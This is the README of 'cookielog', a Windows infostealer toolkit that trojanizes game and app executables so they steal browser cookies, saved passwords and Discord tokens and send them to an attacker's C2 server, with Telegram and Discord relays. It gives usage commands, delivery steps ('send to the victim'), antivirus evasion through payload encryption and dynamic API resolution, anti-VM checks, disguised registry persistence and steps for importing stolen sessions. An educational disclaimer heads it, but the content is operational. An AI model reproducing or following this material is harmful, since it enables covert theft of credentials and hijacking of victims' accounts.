# cookielog

```
 +----------------------------------------------------------------------+
 |                                                                      |
 |   EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH AND TRAINING         |
 |                                                                      |
 |   This is offensive security tooling for penetration testing,        |
 |   red-team exercises, and security education. It builds an           |
 |   infected executable that extracts browser cookies from a           |
 |   target machine and exfiltrates them to a remote C2 server.         |
 |                                                                      |
 |   ONLY use this on systems you own or are explicitly authorized      |
 |   to test. Unauthorized use against third-party systems, networks,   |
 |   or individuals is illegal in most jurisdictions and may result     |
 |   in criminal prosecution.                                           |
 |                                                                      |
 |   The authors are not responsible for misuse. This code is           |
 |   provided for learning how cookie-stealing attacks work so          |
 |   that defenders can build detection and mitigation.                 |
 |                                                                      |
 +----------------------------------------------------------------------+
```

Cookie exfiltration toolkit for Windows. Steals cookies from Chromium-based browsers
(Chrome, Edge, Brave, Vivaldi, Opera) and Firefox by injecting a CRT-less payload into a
legitimate host `.exe` via process hollowing. The payload extracts cookies on the victim's
machine and exfiltrates them over HTTP to an attacker-controlled listener, in Cookie-Editor
JSON format that imports directly into a browser.

A legacy Python extractor (`cookielog.py`) and a local named-pipe mode (`sink.py`) are also
included for direct extraction without injection.

---

## Installation

Run the installer -- it installs all dependencies automatically:

```bat
install.bat              :: install everything (Python, MSVC, CLI tools, build)
install.bat --check      :: check what's installed (don't install anything)
install.bat --no-build   :: skip MSVC + build (Python + CLI tools only)
install.bat --no-tools   :: skip CLI tools (fzf, bat, ripgrep, clink)
```

What `install.bat` does:

1. **Python pip packages** -- `cryptography`, `websocket-client` from `requirements.txt`
2. **MSVC Build Tools 2022** -- C++ workload via winget (~2 GB download, needed to compile the
   payload). Python tools work without MSVC; you only need it to run `build.bat`.
3. **CLI tools** -- Clink (cmd autocomplete), fzf (fuzzy finder), bat (syntax-highlighted cat),
   ripgrep (fast grep) -- all via winget
4. **cmd_init.cmd** -- copies to `%USERPROFILE%\bin\` and sets the `AutoRun` registry key so
   Linux-style aliases (`ls`, `cat`, `grep`, etc.) load on every cmd.exe start
5. **Build** -- runs `build.bat` to compile `loader.exe` + `ckdll.dll` (if MSVC is available)

After installation, start cookielog with:

```bat
auto.bat
```

---

## Relay: Telegram & Discord

The listener (`listen.py`) can forward a summary of every received cookie batch to
Telegram or Discord. This is useful when the attacker's C2 port is firewalled --
the payload still POSTs to your listener over HTTP, and the listener re-sends a
summary to Telegram/Discord over HTTPS (which passes most firewalls).

Both relays are **optional** -- if no `--telegram` or `--discord` flag is passed,
the listener just saves cookies to `loot/` as usual.

**Keys are saved automatically** -- the first time you pass `--telegram` or `--discord`,
the value is stored in `config.json`. On subsequent runs, just run `python auto.py`
without the flag and the saved key is loaded automatically.

```bat
python auto.py --config             :: show saved keys (masked)
python auto.py --clear-telegram     :: remove saved Telegram token
python auto.py --clear-discord      :: remove saved Discord webhook
```

### Telegram setup

1. **Create a bot** (takes 30 seconds):
   - Open Telegram, search for **@BotFather**
   - Send `/newbot`
   - Pick a name and username (e.g. `mycookielog_bot`)
   - BotFather replies with an **API token** like `8975447629:AAFzK9wam_2jfoZ...`

2. **Get your chat ID** (so the bot knows who to message):
   - Send any message to your new bot (e.g. "hi")
   - Run the helper script (it queries the API and saves to config automatically):
     ```bat
     python tg_chatid.py 8975447629:AAFzK9wam_2jfoZ...
     ```
   - It prints your chat ID and the full `--telegram` string, and saves to `config.json`

3. **Run the listener with relay**:
   ```bat
   python listen.py 9090 --telegram 8975447629:AAFzK9wam_2jfoZ...:987654321
   ```
   Format: `--telegram <bot_token>:<chat_id>`

   Or via `auto.py` (starts listener + infects in one command):
   ```bat
   python auto.py "GET UPSTAIRS (64bit)" --telegram 8975447629:AAFzK9wam_2jfoZ...:987654321
   ```

   After the first run, the key is saved -- next time just:
   ```bat
   python auto.py "GET UPSTAIRS (64bit)"
   ```

4. **What you receive**: when the victim runs the infected exe, you get a Telegram
   message like:
   ```
   cookielog: 680 cookies received

   Top domains:
     312  google.com
     145  youtube.com
      89  github.com
      ...
   Full JSON: loot/all_cookies.json
   ```

### Discord setup

1. **Create a webhook** (takes 10 seconds):
   - Open Discord, go to the server where you want notifications
   - **Server Settings** -> **Integrations** -> **Webhooks** -> **New Webhook**
   - Pick a name (e.g. "cookielog"), pick a channel
   - Click **Copy Webhook URL** -- it looks like:
     ```
     https://discord.com/api/webhooks/1234567890/abc-def-ghi...
     ```

2. **Run the listener with relay**:
   ```bat
   python listen.py 9090 --discord https://discord.com/api/webhooks/1234567890/abc-def-ghi...
   ```
   Or via `auto.py`:
   ```bat
   python auto.py "GET UPSTAIRS (64bit)" --discord https://discord.com/api/webhooks/1234567890/abc-def-ghi...
   ```

3. **What you receive**: when cookies arrive, the Discord webhook posts a message like:
   ```
   cookielog: **680 cookies** received

   Top domains:
   `  312`  google.com
   `  145`  youtube.com
   `   89`  github.com
   ...
   ```

### Combining both

You can use both relays at the same time:

```bat
python auto.py "GET UPSTAIRS (64bit)" --telegram 7123456789:AAH...:987654321 --discord https://discord.com/api/webhooks/123/abc
```

### Notes

- The relay sends a **summary** (top 15 domains + cookie count), not the full cookie
  JSON -- the full data is still saved in `loot/all_cookies.json` on the listener side.
- Discord has a 2000-character message limit; the summary is truncated to 1900 chars.
- The relay uses Python's `urllib.request` (HTTPS) -- no extra pip packages needed.
- If the relay fails (bad token, wrong chat ID, network error), the listener logs
  the error but **still saves cookies locally** -- no data is lost.

---

## What's New

### v5 -- AV evasion + GUI C2 detection (current)

**XOR-encrypted payload (Defender evasion).** The payload DLL was previously embedded
as plaintext in `loader.exe` via `payload.h`. Windows Defender detected it via static
signature matching of imports (`BCryptDecrypt`, `CryptUnprotectData`,
`WriteProcessMemory`) and strings (`Cookies`, `Local State`, `encrypted_key`).

The payload is now XOR-encrypted by `gen.ps1` with a 16-byte key derived from the
DLL's own bytes. At runtime, `loader.cpp` decrypts it in memory before injection.
Verified: all payload strings are hidden in the compiled `loader.exe`; the three
sentinels (`CKC2_DEADBEEF_`, `CKPR____`, `CKAV0000`) remain findable for `auto.py`
patching.

**Dynamic API resolution.** `WriteProcessMemory`, `VirtualAllocEx`,
`VirtualProtectEx`, and `CreateRemoteThread` are now resolved at runtime via
`GetProcAddress` instead of being in the loader's IAT. This removes the classic
"process injection" import table signature.

**notepad.exe hollowing.** Process hollowing now uses `notepad.exe` instead of
`cmd.exe`. `cmd.exe` hollowing is a well-known Defender signature. Falls back to
`cmd.exe` if `notepad.exe` is missing.

**Sentinel patching flow.** The loader has its own plaintext copies of the
C2/persistence/anti-VM sentinels in its `.data` section. At runtime,
`DecryptPayload()` decrypts the XOR'd payload, searches for the sentinels, and
patches them with the loader's values before injection. This allows `auto.py` to
patch the sentinels in `loader.exe` (plaintext, findable) while the payload itself
remains encrypted.

**`--no-anti-vm` flag.** New sentinel `g_skip_av[8]` (`CKAV0000`) in `ckdll.cpp`.
When patched to `CKAV0001` (via `--no-anti-vm` in `auto.py` or the GUI checkbox),
`IsAnalysisEnv()` returns false immediately, allowing the payload to run in VMs
(VMware, VirtualBox). Needed for testing on VM targets.

**`--c2` flag + GUI public IP detection.** The most common reason external victims
didn't return data: `detect_ip()` returns a LAN address (192.168.x.x), which is
unreachable from outside the attacker's network. The C2 URL embedded in the exe
pointed to this LAN IP, so the victim's HTTP POST silently timed out.

Fixes:
- `--c2 http://YOUR_PUBLIC_IP:PORT/` flag in `auto.py` for manual C2 URL
- `detect_public_ip()` function: fetches public IP via `https://api.ipify.org`
- GUI: "DETECT PUBLIC IP" button fills the C2 URL field with the public IP
- GUI: "DETECT LAN IP" button uses `detect_ip()` (for local testing)
- GUI: "TEST C2" button does a TCP connect to verify the listener is reachable
- GUI: editable C2 URL field (pre-filled with LAN IP, can be changed to public)
- GUI: NAT warning shown when LAN IP is detected
- NAT warning in CLI output when private IP is detected

**GUI anti-VM checkbox.** The GUI now has a "Disable anti-VM" checkbox that
patches `CKAV0000` -> `CKAV0001` in `loader.exe`, disabling VM MAC / debugger /
sandbox checks in the payload.

**Troubleshooting output.** When not in `--run` mode, `auto.py` prints a
troubleshooting checklist:
1. Is the listener reachable from the victim?
2. LAN IP warning (external machines can't reach 192.168.x.x)
3. Port forwarding reminder
4. Defender quarantine warning
5. VM detection (`--no-anti-vm`)
6. Telegram/Discord relay fallback

**Test result.** Infected exe built with XOR-encrypted payload + dynamic API +
notepad.exe hollowing. Payload extracted 758 Firefox cookies + 82 passwords +
Discord tokens, exfiltrated 369KB via HTTP. All payload strings verified hidden in
`loader.exe`. All 3 sentinels verified findable and patchable.

### v4 -- UTF-8 fix, SHA256 domain hash verification, session cryptanalysis

**PutJ UTF-8 passthrough (critical).** The payload's manual JSON serializer was escaping
bytes >= 0x80 as `\u00XX`, which corrupts UTF-8 multi-byte sequences. For example, the
character `ç` (UTF-8 `0xC3 0xA7`) was being escaped as `\u00c3\u00a7`, which decodes to
`Ã§` instead of `ç`. This affected cookie values and saved passwords containing accented
characters (common in Portuguese, French, Spanish names and passwords).

Fix: removed the `c>127` condition from the escape branch. `PutJ` now only escapes
control characters (`c < 32`) as `\u00XX`; bytes >= 0x80 pass through as raw UTF-8, which
is valid JSON since JSON strings are defined as sequences of UTF-8 encoded Unicode code
points.

Test result: 82 passwords, all 82 clean (0 dirty). Before the fix, 8 of 82 were corrupted.
Example: `Ma@çhado90_90` (was `Ma@Ã§hado90_90`), `Maçhado9090$_` (was `MaÃ§hado9090$_`).

**SHA256 domain hash verification in DecCookie.** Chrome >= 118 prepends a 32-byte
`SHA256(host_key)` hash to the AES-256-GCM decrypted plaintext of both v10 and v20
cookies. The previous fix (v3) unconditionally stripped the first 32 bytes from all v10
decrypted values, which corrupts password values (passwords do not have this prefix).

Fix: `DecCookie` now takes a `host_key` parameter (the cookie's domain, e.g.
`.youtube.com`). After AES-GCM decryption, it computes `SHA256(host_key)` and compares
it to the first 32 bytes of the plaintext. If they match, the 32-byte domain hash is
stripped. If they don't match (passwords, or cookies from older Chrome versions without
the hash), 0 bytes are stripped. This correctly handles:
- v10 cookies with domain hash (Chrome >= 118) -- 32 bytes stripped
- v10 cookies without domain hash (Chrome < 118) -- 0 bytes stripped
- v20 cookies (Chrome >= 127, app-bound) -- 32 bytes stripped
- Passwords (v10 encrypted, no domain hash) -- 0 bytes stripped

**Manual SHA-256 implementation.** Added a from-scratch FIPS 180-4 SHA-256 implementation
(`Sha256Hash`, `Sha256Init`, `Sha256Update`, `Sha256Final`, `Sha256Block`) in `ckdll.cpp`.
This is needed because the CRT-less payload cannot use the standard library's hash
functions, and `BCryptHash` requires additional setup that is fragile in the hollowed
process. The implementation is ~60 lines, uses only `memset`/`memcpy` (custom CRT), and
produces a 32-byte digest used for domain hash verification.

**UTF-16LE detection for passwords.** `DumpPasswords` now checks whether the decrypted
password value is UTF-16LE encoded (every odd byte is `0x00`). If so, it converts to
UTF-8 before JSON output. In practice, Chromium stores passwords as UTF-8, so this rarely
triggers -- but it prevents garbage output if a password is stored as UTF-16LE.

**`session_break.py` -- Python session cookie cryptanalysis tool.** A standalone Python
tool that combines handle hijacking (same `NtQuerySystemInformation` technique as the C++
payload), DPAPI key extraction, and AES-256-GCM decryption with full cryptanalysis of the
decrypted session cookie values. Features:

- **Handle hijack** -- `hijack_cookie_db()` duplicates the browser's SQLite handle via
  `NtQuerySystemInformation(0x40)` with a growing buffer (4MB initial, retries with
  `ret_len + 0x10000` until success). Handles the ~311k-handle / ~12MB buffer requirement.
- **DPAPI + AES-GCM** -- `get_chromium_key()` decrypts the `Local State` AES key via
  `CryptUnprotectData`; `decrypt_chromium_value()` decrypts v10/v20 cookies with
  `BCryptDecrypt` and strips the 32-byte SHA256 domain hash when it matches.
- **Cryptanalysis** -- `classify_and_analyze()` classifies each session cookie value by
  structure: JWT, hex string, base64, numeric, URL-encoded JSON, opaque token, Express
  signed cookie, two-part token. For JWTs, `analyze_jwt()` decodes header + payload and
  assesses the `alg` field for forgery vulnerabilities (e.g. `alg: none`, `HS256` with
  known/weak keys). `assess_jwt_forgery()` and `assess_entropy_forgery()` evaluate whether
  the session can be forged without the server's secret. `find_correlations()` detects
  shared prefixes, substrings, and duplicate values across cookies.
- **Outputs** -- `loot/session_decrypted.json` (decrypted session cookies with analysis
  metadata) and `loot/cryptanalysis_report.json` (classification summary, forgery
  assessment, correlations).

**`COOKIE_EDITOR_GUIDE.md`.** New guide file with step-by-step instructions for importing
`loot/session_cookies.json` into the Cookie-Editor browser extension, including per-domain
import instructions, Netscape format fallback, troubleshooting table, and file format
reference.

**Test results (v4).** 90 session cookies (all 90 clean, 0 dirty), 82 passwords (all 82
clean, 0 dirty). High-value session cookies captured: chatgpt.com (`csrf`, `oai-gn`,
`oai-asli`, `callback-url`), github.com (`_gh_sess`, `color_mode`, `tz`),
steamcommunity.com (`sessionid`, `steamCountry`), claude.ai (`_cfuvid`, `ion-vk`),
discord.com (`locale`, `_cfuvid`), instagram.com (`rur`), youtube.com (`YSC`),
google.com (`S`, `GMAIL_AT`).

### v3 -- handle hijacking

**Browser-locked DB extraction without closing the browser.** Vivaldi (and some Vivaldi (and some
Chrome/Edge configurations) hold a 0-sharing lock on the cookie/password SQLite DB,
causing `CreateFileW` to fail with error 32 (`ERROR_SHARING_VIOLATION`). The payload
now falls back to **handle hijacking**: it enumerates all system handles via
`NtQuerySystemInformation(SystemExtendedHandleInformation)`, finds the browser
process's file handle to the SQLite DB, duplicates it with `DUPLICATE_SAME_ACCESS`
(`GENERIC_READ` fails because the browser's handle lacks `READ_CONTROL`), reads
the file in 64KB chunks via `ReadFile`, and verifies the expected table (`cookies`
or `logins`) exists. This extracts cookies from a running browser without closing it.

Test result: 1741 cookies (680 Firefox + 1061 Vivaldi) + 82 passwords + 57 session
cookies (chatgpt.com, github.com, x.com, steamcommunity.com, claude.ai, discord.com,
youtube.com, deepl.com, soundcloud.com, etc) extracted from Vivaldi while it was
running with 30 processes.

**Buffer increase.** `g_out` (the JSON output buffer) was increased from 512KB to 2MB.
With Vivaldi cookies added, the total exceeded 512KB, which silently dropped the
closing `]` bracket (the `Put()` function discards writes past the buffer end),
producing invalid JSON that the listener rejected.

**Loot file renaming.** The output files were renamed for clarity:
- `cookies.json` -> `all_cookies.json` (cookies only, no passwords)
- `cookies.txt` -> `all_cookies.txt` (Netscape format of the above)
- New: `passwords.json` + `passwords.txt` (saved passwords with usernames)
- `session_cookies.json` (real session cookies: `expirationDate == 0` and `name != "password"`)
- `session_cookies.txt` (Netscape format of the above)

Previously, `cookies.json` mixed cookies and passwords, and `session_cookies.json`
contained only passwords (because passwords have `expirationDate == 0`), which was
backwards and misleading.

**Hidden `~ck_bak.bin`.** The loader's backup file (created during rename-restore) is
now marked `FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM`, so it doesn't appear in
Explorer even with "show hidden files" enabled (requires "show protected system files").

**GUI relay checkboxes.** The `auto.py` GUI replaced toggle buttons (ON/OFF) with
checkboxes for Telegram/Discord. Keys are saved to `config.json` regardless of checkbox
state; the checkbox only controls whether the relay is active for the current run.
Previously, toggling off cleared the Entry field, which deleted the key from config.

### v2 -- payload improvements

**Chromium cookie fix (browser-locked DBs):** `CopyFileW` was replaced with
`CreateFileW(FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE)` + manual `ReadFile`.
This bypasses the exclusive lock Chrome/Edge hold on their live cookie databases --
cookies are now extracted even when the browser is running (previously only Firefox worked).

**More browsers:** Chromium, Thorium, CocCoc, and Yandex Browser added to the browser
profile list (9 total: Chrome, Edge, Brave, Vivaldi, Opera, Chromium, Thorium, CocCoc, Yandex).

**Discord token extraction:** Scans Discord's LevelDB files (`%APPDATA%\Discord\Local Storage\
leveldb\*.ldb`) for MFA tokens (`mfa.*` pattern) and exfiltrates them as cookie-like entries.

**Browser password extraction:** Reads Chromium `Login Data` SQLite DBs, decrypts saved
passwords with the same AES-256-GCM key used for cookies (v10/v11/v20), and exfiltrates
them with the associated username and origin URL.

**XOR-encrypted payload (reverted):** XOR encryption was tested but reverted because it made
the C2 and persistence sentinels (`CKC2_DEADBEEF_`, `CKPR____`) unfindable in `loader.exe`,
breaking C2 URL patching -- the payload fell back to `drop.json` instead of HTTP. The DLL is
now embedded as plaintext in `loader.exe`.

**Anti-analysis:** The payload now checks for:
- VM MAC address prefixes (VMware, VirtualBox, QEMU -- Hyper-V excluded due to WSL false positive)
- Only checks physical adapters (type 6 Ethernet, type 71 Wireless); skips "Virtual"/"WSL" descriptions
- Debuggers (`IsDebuggerPresent`, `CheckRemoteDebuggerPresent`)
- Analysis processes (x64dbg, IDA, Wireshark, Process Hacker, etc.)
- Sleep acceleration (sandbox timing check)
If any check fails, the payload exits silently without extracting cookies.

**Persistence:** `--persist` flag patches a sentinel in the loader that makes the payload
install a `HKCU\...\Run\WindowsDefenderHelper` registry key on the victim, re-executing
the infected exe on every login.

**Telegram + Discord relay:** `listen.py` can relay received cookie summaries to Telegram
Bot API or Discord webhooks, bypassing firewall restrictions on the attacker's C2:

```bat
python auto.py game.exe --telegram 123456:ABC-DEF@bot:987654321
python auto.py game.exe --discord https://discord.com/api/webhooks/123/abc
```

**JSON escaping fix (critical):** The payload's manual JSON serializer used raw `Put()` (no
escaping) for password URLs, password values, and Discord tokens. Decrypted passwords
contain binary/control characters that produced invalid JSON, causing the listener to reject
the entire POST with `Invalid control character at: line 1 column 73`. Fixed by replacing
`Put()` with `PutJ()` (which escapes `"`, `\`, control chars, and non-ASCII as `\u00XX`).
Also fixed a double-quote bug in the `_username` field (`PutJ` already includes quotes).

**Socket timeout:** Added `SO_RCVTIMEO`/`SO_SNDTIMEO` (10s) to the exfiltration socket so the
payload doesn't hang forever if the listener doesn't respond. Previously, a broken listener
caused the payload thread to block indefinitely in `recv()`.

**Session cookie filter:** `listen.py` now writes `loot/session_cookies.json` and
`loot/session_cookies.txt` containing only real session cookies (`expirationDate == 0`
and `name != "password"`). Previously, passwords (which also have `expirationDate == 0`)
were mixed in, making the session file misleading. Passwords are now in `loot/passwords.json`.

**Interactive terminal mode:** `python auto.py` with no args now asks: [1] GUI, [2] Terminal,
[3] Quick infect. Terminal mode has an `input()` loop with commands: `infect`, `gui`,
`telegram`, `discord`, `relay`, `port`, `persist`, `config`, `tg-chatid`, `build`, `install`,
`test-listener`, `help`, `exit`. Invalid commands print "comando invalido digite help" without
exiting.

**Config persistence:** `config.json` (gitignored) stores Telegram token, Discord webhook,
port, and persist flag. Values are auto-saved when passed via CLI flags or the GUI save
button, and auto-loaded on subsequent runs.

**GUI relay toggle:** The `auto.py` GUI now has Telegram/Discord Entry fields with Toggle
buttons (ON/OFF) and a SAVE RELAY SETTINGS button. Toggling off clears the field; toggling on
restores from config.

### v1 -- `auto.py` one-click setup (GUI + CLI)

A single script that does everything: builds binaries, detects your IP, starts the listener,
infects the target, and optionally runs it locally for testing. Replaces the manual
`start_attack.bat` + `pick.py` workflow for most use cases.

```bat
python auto.py                              :: GUI: pick folder or .exe
python auto.py "GET UPSTAIRS (64bit)"       :: CLI: infect a folder
python auto.py game.exe                     :: CLI: infect a standalone .exe
python auto.py "GET UPSTAIRS (64bit)" --run :: CLI: infect + run locally (test)
python auto.py game.exe --run --port 9420   :: custom port + local test
```

GUI has 4 buttons:
- **SELECT FOLDER (game/app with files)** -- copies the folder, finds the main .exe, infects in place
- **SELECT FOLDER + RUN LOCALLY (test)** -- same, then runs it on your machine
- **SELECT .EXE (standalone, no folder)** -- infects a single .exe
- **SELECT .EXE + RUN LOCALLY (test)** -- same, then runs it

### `ifec/folds/` and `ifec/apps/` output structure

Infected outputs are now split by type:

```
ifec/
  folds/    <- exes that need their folder (games, apps with DLLs/data)
    <game folder>/
      <game>.exe       (INFECTED)
      <game>_Data/     (original, intact)
      *.dll            (original, intact)
  apps/     <- standalone exes (no folder dependencies)
    <name>.exe         (INFECTED)
```

Folder mode: `auto.py` copies the entire folder to `ifec/folds/<name>/`, auto-detects the
main .exe (Unity `<name>_Data/` heuristic, fallback to largest .exe, skips helper exes like
`UnityCrashHandler`), and overwrites it with the infected version. The original source folder
is never touched.

### `listen.py` -- fast startup fix

`HTTPServer.server_bind()` was overridden to skip `socket.getfqdn("0.0.0.0")`, which does a
reverse DNS lookup that takes **4+ seconds** on Windows. This delayed `listen()` enough that
the payload's HTTP connect failed with `WSAECONNREFUSED` (10061). The fix calls
`TCPServer.server_bind()` directly and uses `socket.gethostname()` (local, instant). The
listener now reaches `LISTENING` state in under 1 second.

### `auto.py --run` -- restore fix

The original .exe restore after a local test was failing with `WinError 32` (file locked). Root
cause: the **game process** (launched by the loader's rename-restore) holds the file lock, not
the hollowed `cmd.exe`. Fix: kill the game by exe name (`taskkill /F /IM`) before restore, plus
targeted cleanup of the orphaned `cmd.exe` by `ParentProcessId` (PowerShell, not
`taskkill /IM cmd.exe` which kills ALL cmd.exe).

### Other changes

- **`install.bat`** -- one-click dependency installer: Python pip packages, MSVC Build Tools,
  CLI tools (Clink, fzf, bat, ripgrep) via winget, `cmd_init.cmd` setup, autorun registry,
  and payload build. Supports `--check` (status only), `--no-build`, `--no-tools`.
- **`auto.bat`** -- shortcut: `python auto.py %*`
- **`cmd_init.cmd`** -- Linux-style aliases for cmd.exe (`ls`, `cat`, `grep`, `..`, `...`) +
  cookielog shortcuts (`cl_auto`, `cl_pick`, `cl_listen`) + Python shortcuts (`py`, `pi`, `pf`).
  Installed to `%USERPROFILE%\bin\cmd_init.cmd` with autorun registry key.
- **`PAYLOAD_STEPS.txt`** (English) and **`PAYLOAD_STEPS_PTBR.txt`** (Portuguese) -- step-by-step
  walkthrough of the payload execution chain (267 lines each).
- **`swap.py --session`** -- renamed from `--sessao` to English.
- **All comments, docstrings, and UI strings** translated to English across all source files.

---

## Project structure

```
cookielog/
|-- DISCLAIMER            # Educational use disclaimer (read this first)
|-- install.bat           # One-click dependency installer (Python, MSVC, CLI tools)
|-- auto.py               # One-click: build + listen + infect + test (GUI + CLI)
|-- auto.bat              # Shortcut: python auto.py %*
|-- pick.py               # GUI infector (standalone, manual C2 config)
|-- listen.py             # HTTP listener: receives exfiltrated cookies
|-- session_break.py      # Python session cookie extractor + cryptanalysis (791 lines)
|-- tg_chatid.py          # Helper: finds Telegram chat ID from bot token
|-- sink.py               # Named pipe server (local fallback, no C2 needed)
|-- swap.py               # Splits cookies by site (per-site cookies.txt)
|-- cookielog.py          # Legacy Python extractor (SQLite + DPAPI + AES-GCM)
|-- build.bat             # Compiles ckdll.dll + loader.exe (needs MSVC)
|-- start_attack.bat      # Starts listener + pick.py GUI together
|-- test_curl.bat         # Tests listener with curl
|-- cmd_init.cmd          # Linux-style aliases for cmd.exe
|-- COOKIE_EDITOR_GUIDE.md # How to import session cookies into Cookie-Editor extension
|-- PAYLOAD_STEPS.txt     # Payload execution walkthrough (English)
|-- PAYLOAD_STEPS_PTBR.txt # Payload execution walkthrough (Portuguese)
|-- requirements.txt      # Python deps
|-- config.json           # Saved API keys (auto-generated, gitignored)
|-- .gitignore
|-- src/
|   |-- ckdll.cpp         # Payload DLL (CRT-less, injectable, ~1341 lines)
|   |-- loader.cpp        # Loader (process hollowing + XOR decrypt + sentinel patch)
|   |-- payload.h         # XOR-encrypted DLL bytes (auto-generated by gen.ps1)
|   `-- gen.ps1           # XOR-encrypts ckdll.dll -> payload.h (16-byte key from DLL bytes)
|-- bin/                  # Build output
|   |-- loader.exe        # ~156 KB (XOR payload + dynamic API, no injection imports in IAT)
|   `-- ckdll.dll         # ~49 KB
|-- ifec/                 # Infected outputs (gitignored)
|   |-- folds/            # Folder-mode infections (game + dependencies)
|   `-- apps/             # Standalone infections (single .exe)
|-- loot/                 # Captured cookies (gitignored)
|   |-- all_cookies.json  # All cookies, Cookie-Editor JSON (no passwords)
|   |-- all_cookies.txt   # All cookies, Netscape format
|   |-- passwords.json    # Saved passwords with usernames
|   |-- passwords.txt     # Saved passwords (tab-separated)
|   |-- session_cookies.json # Session-only cookies (expirationDate == 0)
|   |-- session_cookies.txt  # Session-only, Netscape format
|   |-- session_decrypted.json  # Decrypted session cookies + analysis (session_break.py)
|   `-- cryptanalysis_report.json # Cryptanalysis summary (session_break.py)
`-- tools/
    `-- PsExec64.exe      # Sysinternals (for legacy v20 extraction)
```

---

## Quick start

### One-click (recommended)

```bat
:: GUI mode -- pick a folder or .exe from a dialog
python auto.py

:: CLI -- infect a game folder (copies to ifec/folds/, infects in place)
python auto.py "C:\Games\GET UPSTAIRS (64bit)"

:: CLI -- infect + run locally for testing
python auto.py "C:\Games\GET UPSTAIRS (64bit)" --run

:: CLI -- infect a standalone .exe (output to ifec/apps/)
python auto.py "C:\Tools\app.exe"
```

`auto.py` does everything automatically:

1. Checks if `loader.exe` + `ckdll.dll` exist; if not, runs `build.bat`
2. Detects your local IP (UDP connect to 8.8.8.8). Use `--c2` or the GUI "DETECT PUBLIC IP"
   button for external targets behind NAT.
3. Starts `listen.py` in a new console window
4. Infects the target (folder mode copies the folder; standalone mode just infects the file)
5. Without `--run`: prints instructions (send `ifec/folds/` or `ifec/apps/` to the victim)
   With `--run`: executes the infected exe, waits for cookies, kills the game, restores

### Manual (pick.py)

```bat
:: start listener + infector GUI together
start_attack.bat

:: or run pieces manually
python listen.py 9090          :: terminal 1 (listener)
python pick.py                  :: terminal 2 (infector GUI)
```

In the `pick.py` GUI:

1. The C2 URL field is pre-filled with `http://<auto-detected-LAN-IP>:9400/`. For external
   victims, click **DETECT PUBLIC IP** to use your WAN address instead (requires port
   forwarding on your router). Use **TEST C2** to verify the listener is reachable.
2. Click **Browse** and select a host `.exe`.
3. Click **Infect**. The infected binary is written to `ifec/<name>.exe`.
4. Send `ifec/<name>.exe` to the victim.
5. If the victim is on a VM, check **Disable anti-VM** before infecting.

---

## Attack flow

The end-to-end infection and exfiltration chain:

1. **Attacker runs `auto.py`.** It builds binaries (if needed), detects the local LAN IP,
   starts `listen.py` on the chosen port, and infects the target.
2. **Infection.** `auto.py` (or `pick.py`) appends the original host bytes to `loader.exe` and
   patches the C2 URL, persistence, and anti-VM sentinels in the loader's `.data` section.
   At runtime, the loader XOR-decrypts the payload and copies its patched sentinel values
   into the decrypted buffer before injection.
   - **Folder mode:** copies the entire game/app folder to `ifec/folds/<name>/` and overwrites
     the main .exe with the infected version.
   - **Standalone mode:** writes the infected .exe to `ifec/apps/<name>.exe`.
3. **Delivery.** The attacker sends `ifec/folds/<name>/` (folder) or `ifec/apps/<name>.exe`
   (standalone) to the victim.
4. **Victim runs it.** The host app/game opens normally (rename-restore preserves the original
   exe name, which Unity games require), and a hidden payload runs via process hollowing of
   `notepad.exe` (v5; `cmd.exe` fallback).
5. **Extraction.** The payload extracts cookies from Chrome / Edge / Brave / Vivaldi / Opera
   (Chromium-based) and Firefox on the **victim's** machine.
6. **Exfiltration.** The payload sends the cookies via HTTP POST (Winsock2) to the attacker's
   C2 URL as Cookie-Editor JSON.
7. **Reception.** `listen.py` receives the JSON, merges/dedups against the existing collection
   (keyed on `domain`+`name`+`path`), and writes `loot/all_cookies.json` + `loot/all_cookies.txt`
   + `loot/session_cookies.json` + `loot/passwords.json`.
8. **Import.** The attacker imports `loot/session_cookies.json` (or `all_cookies.json`) into
   their own browser via the Cookie-Editor extension. See
   **[COOKIE_EDITOR_GUIDE.md](COOKIE_EDITOR_GUIDE.md)** for step-by-step instructions.
9. **Cryptanalysis (optional).** `session_break.py` runs on the attacker's machine to
   decrypt session cookies and analyze their structure (JWT, forgery potential,
   cross-domain correlations). Outputs `loot/session_decrypted.json` and
   `loot/cryptanalysis_report.json`.

---

## Usage reference

### `auto.py` -- one-click setup

```bat
python auto.py                              :: GUI (file/folder picker)
python auto.py <folder>                     :: infect folder -> ifec/folds/
python auto.py <file.exe>                   :: infect standalone -> ifec/apps/
python auto.py <folder> --run               :: infect + run locally (test)
python auto.py <folder> --run --port 9420   :: custom port
python auto.py --cli                        :: force CLI (skip GUI)
python auto.py --config                     :: show saved relay settings
python auto.py --telegram <token:chat_id>   :: set Telegram relay
python auto.py --discord <webhook_url>      :: set Discord relay
python auto.py --persist                    :: enable registry persistence
python auto.py --c2 http://1.2.3.4:9400/     :: set C2 URL (external targets)
python auto.py --no-anti-vm                 :: disable VM/debugger checks (for VM testing)
python auto.py --find-port                  :: auto-scan for a free port (9400-9500)
python auto.py --clear-telegram             :: remove Telegram from config
python auto.py --clear-discord              :: remove Discord from config
```

Options:

| Flag | Effect |
|---|---|
| `--port N` | C2 listener port (default: 9090) |
| `--run` | Run the infected exe locally after infecting (test mode) |
| `--cli` | Force CLI mode (no GUI dialog) |
| `--telegram <token:chat_id>` | Telegram relay (saved to config.json) |
| `--discord <webhook_url>` | Discord relay (saved to config.json) |
| `--persist` | Enable registry Run key persistence (saved to config.json) |
| `--c2 <url>` | Override C2 URL (e.g. `http://PUBLIC_IP:9400/`). Use when victim is outside your LAN. GUI: "DETECT PUBLIC IP" button |
| `--no-anti-vm` | Disable VM MAC / debugger / sandbox checks (patch `CKAV0000` -> `CKAV0001`). Use for VM targets |
| `--find-port` | Scan ports 9400-9500 and use the first free one. Saved to `config.json`. GUI: "FIND BEST PORT" button |
| `--config` | Show saved relay settings and exit |
| `--clear-telegram` | Remove Telegram token from config.json |
| `--clear-discord` | Remove Discord webhook from config.json |
| *(path arg)* | Path to a folder or .exe (auto-detected) |

With no arguments, `auto.py` asks: [1] GUI, [2] Terminal (interactive), [3] Quick infect.

**Interactive terminal** commands: `infect`, `gui`, `telegram`, `discord`, `clear-telegram`,
`clear-discord`, `relay`, `port`, `find-port`, `persist`, `config`, `tg-chatid <token>`, `build`,
`install`, `test-listener`, `help`, `exit`. Invalid commands print a message without exiting.

In `--run` mode, the C2 URL is forced to `http://127.0.0.1:<port>/` for reliability.
